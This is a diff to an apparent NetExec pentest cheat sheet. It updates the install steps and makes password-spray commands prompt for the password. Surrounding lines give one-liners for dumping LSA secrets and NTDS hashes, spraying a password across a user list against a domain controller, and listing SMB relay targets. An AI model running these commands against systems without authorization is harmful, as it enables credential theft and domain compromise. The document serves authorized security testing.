@@ -8,7 +8,9 @@
 ## Installation
 
 ```bash
-pip install netexec      # or: pipx install netexec
+sudo apt install netexec
+# Alternative from the maintained upstream repository:
+pipx install 'git+https://github.com/Pennyw0rth/NetExec.git'
 nxc --version
 ```
 
@@ -54,8 +56,10 @@ nxc smb $TARGET -u $USER -p $PASS --lsa
 nxc smb $TARGET -u $USER -p $PASS --ntds    # DC only
 
 # Password spray
-nxc smb $DC_IP -u users.txt -p 'Password123!' --no-bruteforce
-nxc smb $DC_IP -u users.txt -p 'Password123!' --continue-on-success
+read -rsp 'Approved spray candidate: ' SPRAY_PASS; printf '\n'
+nxc smb "$DC_IP" -u users.txt -p "$SPRAY_PASS" --no-bruteforce
+nxc smb "$DC_IP" -u users.txt -p "$SPRAY_PASS" --continue-on-success
+unset SPRAY_PASS
 
 # Relay list (hosts with signing disabled)
 nxc smb $SUBNET/24 --gen-relay-list relay.txt
